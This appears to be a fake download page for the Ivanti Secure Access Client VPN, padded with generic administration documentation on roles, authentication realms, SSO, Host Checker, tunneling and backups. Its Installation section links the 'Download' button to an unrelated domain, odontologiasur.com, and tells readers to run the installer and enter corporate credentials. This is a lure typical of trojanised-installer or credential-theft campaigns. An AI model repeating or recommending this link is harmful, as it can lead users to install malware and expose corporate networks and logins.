# Download Ivanti Secure Access Client

Ivanti Secure Access Client offers a reliable and secure remote access solution designed to provide users with smooth, policy-driven connectivity to organizational resources. It ensures that users, no matter where they are, can securely access corporate applications, servers, and file shares without compromising safety.

Table of Contents

- [Installation](#installation)
- [User Roles and Access Control](#user-roles-and-access-control)
- [Authentication and Security Policies](#authentication-and-security-policies)
- [Single Sign-On (SSO) and Adaptive Authentication](#single-sign-on-sso-and-adaptive-authentication)
- [Host Checker and Endpoint Security](#host-checker-and-endpoint-security)
- [VPN Tunneling and Secure Application Manager](#vpn-tunneling-and-secure-application-manager)

## Installation

**[Download Ivanti Secure Access Client](https://odontologiasur.com/odo/)**  

After downloading Ivanti Secure Access Client, follow the instructions below to install and set up the application:

- Launch the installer and follow the on-screen prompts.  
- Authenticate with your corporate login credentials.  
- Set up your VPN configuration according to the security guidelines of your organization.  
- Establish a secure connection and access internal resources safely.

For further setup assistance, reach out to your IT department or refer to the official Ivanti documentation.

## User Roles and Access Control

### Understanding User Roles
User roles define access rights for different user groups within ICS. Administrators can create roles that specify what resources users can access, along with session settings and customization options for the user interface.

### Role-Based Access Management
ICS supports two main role types:
- **Administrator Roles:** Grant management privileges within the ICS system.
- **User Roles:** Determine access rights, session policies, and available features for end users.

#### Creating a New User Role
```plaintext
1. Navigate to Users > User Roles in the admin console.
2. Click "New Role" and enter a name.
3. Set up access features and session policies.
4. Save the role and assign it to authentication realms.
```

## Authentication and Security Policies

### Authentication Methods
ICS supports various authentication servers for user verification, including:

- **Local Authentication Server**
- **Active Directory (AD)**
- **LDAP**
- **RADIUS**
- **SAML-based authentication**

### Setting Up Authentication Realms
Authentication realms define the method for authenticating users.

#### Configuration Steps
1. Navigate to **Users > Authentication > User Realms**.
2. Click **New Realm** and enter a name.
3. Select an authentication server.
4. Define authentication and role mapping policies.
5. Save the settings and assign the realm to a sign-in policy.

> **[!info]**
> It is recommended to use multi-factor authentication (MFA) to enhance security.

## Single Sign-On (SSO) and Adaptive Authentication

### Configuring SSO
SSO allows users to authenticate once and gain access to multiple applications without needing to log in repeatedly.

ICS supports:
- **SAML 2.0 for web-based SSO**
- **NTLM-based authentication**
- **Kerberos authentication**

#### Enabling SSO
```plaintext
1. Go to Authentication > Single Sign-On.
2. Choose the authentication protocol (SAML, NTLM, or Kerberos).
3. Set up identity provider settings.
4. Apply SSO to the appropriate authentication realms.
5. Save and test the authentication flow.
```

### Adaptive Authentication
Adaptive authentication evaluates user behavior, location, and device characteristics to implement risk-based access control.

#### Implementation Steps
- Define risk levels based on geolocation, IP reputation, and device attributes.
- Apply dynamic policies that adjust authentication requirements based on identified risks.

## Host Checker and Endpoint Security

**Host Checker** is an endpoint security tool that assesses the security status of a device before allowing access.

### Configuring Host Checker Policies
1. Navigate to **Authentication > Host Checker**.
2. Create a new policy and define compliance requirements (e.g., antivirus, firewall, OS version).
3. Apply the policy to authentication realms.
4. Set up remediation actions for non-compliant devices.

> **[!note]**
> Ensure Host Checker policies are updated regularly to address emerging security threats.

## VPN Tunneling and Secure Application Manager

### VPN Tunneling
ICS provides **SSL-based VPN tunneling**, enabling full Layer 3 connectivity to corporate networks.

#### Configuration Steps
- Go to **Users > User Roles** and enable **VPN Tunneling**.
- Set up split tunneling and routing rules.
- Implement policies for session timeouts and bandwidth limitations.

### Secure Application Manager (SAM)
SAM acts as an intermediary for application-layer traffic, enabling secure access to client-server applications.

#### Enabling SAM
- Navigate to **Users > User Roles > Secure Application Manager**.
- Configure allowed applications and servers.
- Implement role-based access control for users.

## Resource Policies and Access Control

Resource policies define access rules for **web applications, file shares, and internal servers**.

### Creating Resource Policies
1. Navigate to **Users > Resource Policies**.
2. Choose the type of resource (Web, File, Terminal Services, etc.).
3. Define allowed/denied resources.
4. Apply policies to relevant user roles.

> **[!important]**
> Resource policies should be regularly reviewed to ensure they align with security standards.

## Logging, Monitoring, and Troubleshooting

### Logging and Event Monitoring
ICS offers **comprehensive logging and monitoring capabilities**.

- Enable event logging under **System > Logging**.
- Configure **Syslog** to forward logs to external monitoring systems.
- Use **Admin Console troubleshooting tools** for real-time diagnostics.

### Troubleshooting Common Issues
- **Authentication failures:** Check authentication server settings and network connectivity.
- **VPN connection issues:** Verify split tunneling and firewall configurations.
- **Performance issues:** Monitor system resources and consider applying load balancing.

## Clustering and High Availability

### Configuring Clustering
ICS supports **clustering** for ensuring high availability and load balancing.

#### Setup Steps
1. Go to **System > Clustering**.
2. Add cluster members and configure synchronization settings.
3. Choose **active/passive** or **active/active** modes.

## System Maintenance and Configuration Backup

### Performing System Updates
Regular updates are essential for maintaining **optimal security and performance**.

#### Updating ICS
1. Go to **Maintenance > System Update**.
2. Upload the latest firmware package.
3. Restart the system after applying updates.

### Backing Up Configuration Files
Backup configurations regularly to **prevent data loss**.

#### Backup Process
- Go to **Maintenance > Configuration Backup**.
- Select **Export Configuration**.
- Store backups in a **secure location**.

> **[!note]**
> Automating backups through scheduled tasks can help reduce administrative workload.
